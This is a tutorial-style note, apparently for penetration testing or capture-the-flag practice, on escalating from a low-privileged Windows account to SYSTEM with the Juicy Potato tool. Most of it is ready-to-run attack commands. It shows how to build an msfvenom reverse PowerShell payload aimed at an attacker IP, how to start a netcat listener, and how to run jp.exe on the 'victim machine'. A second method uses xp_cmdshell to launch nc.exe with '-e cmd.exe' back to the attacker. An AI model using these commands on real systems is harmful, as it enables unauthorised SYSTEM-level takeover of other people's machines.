#### **Tokens in Windows**
Every program (process) running on Windows has a **"token"**. Think of this like an **ID card**. It shows **who is running that program** (e.g., a normal user or the SYSTEM user).
- Some programs can **use someone else’s token** to **"pretend" to be them**. This is called **Impersonation**.
- But to do that, the process needs **special rights**:
    - **SeImpersonatePrivilege** (Impersonate someone else)
    - **SeAssignPrimaryTokenPrivilege** (Start a new process with someone else’s token)

> These are powerful rights usually only given to Admins.
___

# Juicy Potato

###  What is Juicy Potato?
**Juicy Potato** is a Windows local privilege escalation tool that abuses the **SeImpersonatePrivilege** to gain **SYSTEM-level access** from a low-privileged user account.
You already have **a shell** (or Meterpreter session) on the **target machine
#### Required Privilege:
- **SeImpersonatePrivilege** **OR**
- **SeAssignPrimaryTokenPrivilege**
>  **You only need one of them to work** (usually `SeImpersonatePrivilege` is enough)

## Method-1 (using shell)
#### 1️ Check User Privileges
On the target machine, run:
```bash
whoami /priv
```
Look for this line:
```
SeImpersonatePrivilege      Enabled
```
> ✅ If it's enabled, you can continue with the Juicy Potato attack!

#### 2️ Download Juicy Potato
Download the executable from:
👉 https://github.com/ohpe/juicy-potato
Rename it (for simplicity):
```bash
jp.exe
```
Copy it to the **victim machine**.
#### 3️ Create a Malicious Payload
On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:
```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
```
Replace `<Your_IP>` and `<Your_Port>` with your Kali IP and chosen port.
Upload `myshell.bat` to the **victim machine**.
#### 4️ Start Netcat Listener
On your Kali machine:
```bash
nc -nlvp <Your_Port>
```
#### 5️ Run Juicy Potato Exploit
On the victim machine:
```bash
jp.exe -t * -p myshell.bat -l 4444
```
- `t *` = Try all available COM types
- `p myshell.bat` = The payload you want to run
- `l 4444` = Port used by the fake COM server (can be any unused port)
###  Result
You should now get a **reverse shell as SYSTEM** on your Netcat listener!

## Method-2 (Using mssqlclient.py)

1. check the privileges 
```sql
SQL> xp_cmdshell whoami
```
2. 
```sql
SQL> xp_cmdshell C:\tools\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe YOUR_IP 8443 -e cmd.exe" -t *  
```
Explanation of flags:
- `-l 1337` = Random COM listener port
- `-p` = Program to run (cmd.exe)
- `-a` = Argument for cmd (Netcat reverse shell)
- `-t *` = Use both token impersonation methods (CreateProcessWithTokenW or CreateProcessAsUser)

you will have a reverse shell on your net cat listener 
